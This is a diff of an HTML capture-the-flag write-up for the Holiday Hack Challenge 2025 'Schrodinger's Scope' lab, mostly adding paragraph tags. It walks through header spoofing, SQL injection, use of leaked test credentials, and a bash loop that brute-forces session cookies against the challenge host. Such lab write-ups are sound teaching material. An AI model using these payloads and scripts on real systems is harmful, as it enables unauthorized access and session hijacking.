@@ -28,11 +28,14 @@ nav: |
 </tr>
 </tbody>
 </table>
-
+<p>
 <h2>Solution Overview</h2>
-
+<br>
+</p>
+<p>
 The objective is to conduct a penetration test of a Neighborhood College Registration system. The test is scoped to a specific path of the application, accessing other paths is limited by an active monitoring system. When a threshold is reached, the engagement is reset. This resets the cookies that track the session and achievements. When this occurs, any vulnerabilities achieved are no longer logged and must be redone. The testing begins with reconnaisance of the application. Vulnerabilities are tested and exploited if possible.
-
+<br>
+</p>
 <table>
 <thead>
 <tr>
@@ -81,25 +84,39 @@ The objective is to conduct a penetration test of a Neighborhood College Registr
 </tr>
 </tbody>
 </table>
-
+<p>
 <h2>Detailed Solution</h2>
+<br>
+</p>
 <details>
+<p>
 <summary>Click to expand</summary>
-
+<br>
+</p>
+<p>
 The initial step was to identify the bot responsible for the additional scope violations
-
+<br>
+</p>
+<p>
 <img src="/HHC_2025/images/shroedingers_webbot.jpg" alt="Identification of WebBot">
-
+<br>
+</p>
+<p>
 With the object pattern identified, it is possible to use browser Developer Tools to block the request.
 <br>
 Selecting "Network Request Blocking" from the More Tools menu. The pattern to block is "<em>gnomeU</em>"
-
+<br>
+</p>
+<p>
 <img src="/HHC_2025/images/shroedingers_webbotblock.jpg" alt="Blocking of WebBot">
-
+<br>
+</p>
+<p>
 Reconnaisance began with examining the contents of the sitemap for the application.
 <br>
 The sitemap was located at: flask-schrodingers-scope-firestore.holidayhackchallenge.com/register/sitemap/?id=2328f6ee-8810-4052-aa3d-f5c75b5cb934
-
+<br>
+</p>
 <pre><code class="language-">
 http://flask-schrodingers-scope-firestore.holidayhackchallenge.com/
 http://flask-schrodingers-scope-firestore.holidayhackchallenge.com/admin
@@ -137,38 +154,66 @@ http://flask-schrodingers-scope-firestore.holidayhackchallenge.com/wip/register/
 http://flask-schrodingers-scope-firestore.holidayhackchallenge.com/wip/register/dev/dev_notes/
 http://flask-schrodingers-scope-firestore.holidayhackchallenge.com/wip/register/dev/dev_todos
 http://flask-schrodingers-scope-firestore.holidayhackchallenge.com/wip/register/dev/dev_todos/
+<p>
 </code></pre>
 <br>
 Exploring the endpoints revealed several pages of notes, two that were within the scope.
 <br>
 The first enpoint found: /register/dev/dev_todos
-
+<br>
+</p>
+<p>
 <img src="/HHC_2025/images/shroedingers_devtodos.jpg" alt="Developer Information To Do List">
-
+<br>
+</p>
+<p>
 The second endpoint found: /register/dev/dev_notes
-
+<br>
+</p>
+<p>
 <img src="/HHC_2025/images/shroedingers_devnotes.jpg" alt="Developer Information Notes">
-
+<br>
+</p>
+<p>
 Locating both of these files construct the Developer information disclosure vulnerability discovered.
-
+<br>
+</p>
+<p>
 <strong>Answer: Developer information disclosure</strong>
-
+<br>
+</p>
+<p>
 With the information the developer left behind, it is possible to attack the login page. Providing the credentials from the note results in an Invalid Forwarding IP error. The X-Forwarded-For header is meant to preserve the true client IP across proxies. But because it can be manually set by clients, it’s vulnerable to spoofing. To bypass this error, we will set the header to 127.0.0.1 in an attempt to trick the web server into believing the request originated from itself.
-
+<br>
+</p>
+<p>
 <img src="/HHC_2025/images/shroedingers_xforwarder.jpg" alt="Spoofing the X-Forwarder Header">
-
+<br>
+</p>
+<p>
 The login "testuser" with the password "2025h0L1d4y5" succeeds, and the /register/courses node is now accessible.
-
+<br>
+</p>
+<p>
 Spoofing the X-Forwarded-For header and authenticating as testuser achieves the second vulnerability.
-
+<br>
+</p>
+<p>
 <strong>Answer: X-Forwarded-For exploit</strong>
-
+<br>
+</p>
+<p>
 Examining the source code for the courses page, a commented secion of code is discovered.
-
+<br>
+</p>
+<p>
 <img src="/HHC_2025/images/shroedingers_commentedsearch.jpg" alt="Commented Search Feature">
-
+<br>
+</p>
+<p>
 Using a snippet of code from the register/js/registerCourses.js in the developer console this feature can be enabled:
-
+<br>
+</p>
 <pre><code class="language-js">
 function checkAndReportCourseSearch() {
   const courseList = document.getElementById('courseSearch');
@@ -183,40 +228,70 @@ function checkAndReportCourseSearch() {
         linkCount: courseList.querySelectorAll('a').length
       })
     })
+<p>
 </code></pre>
 <br>
 Executing the following code in the Developer Console activates the code:
-
+<br>
+</p>
 <pre><code class="language-js">
 fetch('/register/courseSearchUnlocked', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ message: 'Course search was uncommented!', timestamp: Date.now(), linkCount: 1 }) }).then(r => r.text()).then(console.log)
+<p>
 </code></pre>
-
+<br>
+</p>
+<p>
 This activates the search feature in the application:
-
+<br>
+</p>
+<p>
 <img src="/HHC_2025/images/shroedingers_activatedsearch.jpg" alt="Activated Search Feature">
-
+<br>
+</p>
+<p>
 <strong>Answer: Found commented code</strong>
-
+<br>
+</p>
+<p>
 Testing the search interface for SQL Injection (SQLi), the application was found to be vulnerable.  An OR injection (' OR '1'='1) was utilized to list all course entries in the database.
-
+<br>
+</p>
+<p>
 <img src="/HHC_2025/images/shroedingers_searchsqli.jpg" alt="Search SQL Injection">
-
+<br>
+</p>
+<p>
 <strong>Answer: SQL Injection</strong>
-
+<br>
+</p>
+<p>
 This reveals the unauthorized course and allows me to report it:
+<br>
 <img src="/HHC_2025/images/shroedingers_mischief.jpg" alt="Unauthorized Course">
-
+<br>
+</p>
+<p>
 Opening the course details prompts for reporting:
+<br>
 <img src="/HHC_2025/images/shroedingers_gnomecourse.jpg" alt="Unauthorized Course Details">
-
+<br>
+</p>
+<p>
 <strong>Answer: Unauthorized content</strong>
-
+<br>
+</p>
+<p>
 The final hint suggests that a token or cookie may be weak. The error message when attempting to access the wip/holiday_behavior endpoint confirms this idea.
-
+<br>
+</p>
+<p>
 <img src="/HHC_2025/images/shroedingers_wipermissions.jpg" alt="Registration Value">
-
+<br>
+</p>
+<p>
 Looking at the registration values generated:
-
+<br>
+</p>
 <pre><code class="language-">
 registration	eb72a05369dcb44d
 registration	eb72a05369dcb44d
@@ -233,23 +308,25 @@ registration	eb72a05369dcb448
 registration	eb72a05369dcb452
 registration	eb72a05369dcb44a
 registration	eb72a05369dcb443
+<p>
 </code></pre>
-
+<br>
+</p>
+<p>
 Only the last two digits change, this indicates there are only 256 variations.
 <br>
 The TestUser needs to be logged in to test the registration values.
 <br>
 Using this script to locate the valid session:
-
+<br>
+</p>
 <pre><code class="language-sh">
 #!/bin/bash
 prefix="eb72a05369dcb4"
 schrod="7c3ee3a7-6781-459b-8db9-eee63c05558b"
 id="48dd96c0-0794-41cf-96c1-bf3ddc555a30"
-
 for i in {0..255}; do
   hex=$(printf '%02x' $i)
-
 # Login and access page in one flow
   response=$(curl -s -L \
     -H "X-Forwarded-For: 127.0.0.1" \
@@ -260,7 +337,6 @@ for i in {0..255}; do
     -H "X-Forwarded-For: 127.0.0.1" \
     -H "Cookie: Schrodinger=$schrod; registration=${prefix}${hex}" \
     "https://flask-schrodingers-scope-firestore.holidayhackchallenge.com/register/courses/wip/holiday_behavior?id=$id")
-
   if ! echo "$response" | grep -qi "invalid"; then
     echo "============================================"
     echo "VALID REGISTRATION COOKIE FOUND!"
@@ -277,25 +353,35 @@ for i in {0..255}; do
     echo -n "."
   fi
 done
-
 echo ""
 echo "No valid registration cookie found in range 00-ff"
+<p>
 </code></pre>
-
+<br>
+</p>
+<p>
 This results in a VALID REGISTRATION COOKIE FOUND!
 <br>
 registration=eb72a05369dcb44c
-
+<br>
+</p>
+<p>
 Hijacking this session token, the document in wip is accessed.
-
+<br>
+</p>
+<p>
 <strong>Answer: Cookie prediction</strong>
-
+<br>
+</p>
+<p>
 <img src="/HHC_2025/images/shroedingers_final.jpg" alt="Final Assessment Results">
-
+<br>
+</p>
 </details>
-
+<p>
 <h2>Tools Reference</h2>
-
+<br>
+</p>
 <table>
 <thead>
 <tr>
@@ -314,8 +400,10 @@ Hijacking this session token, the document in wip is accessed.
 </tr>
 </tbody>
 </table>
-
+<p>
 <h2>Hints Reference</h2>
+<br>
+</p>
 <table>
 <thead>
 <tr>
@@ -350,8 +438,10 @@ Hijacking this session token, the document in wip is accessed.
 </tr>
 </tbody>
 </table>
-
+<p>
 <h2>Acknowledgements</h2>
+<br>
+</p>
 <table>
 <thead>
 <tr>
@@ -370,4 +460,3 @@ Hijacking this session token, the document in wip is accessed.
 </tr>
 </tbody>
 </table>
-
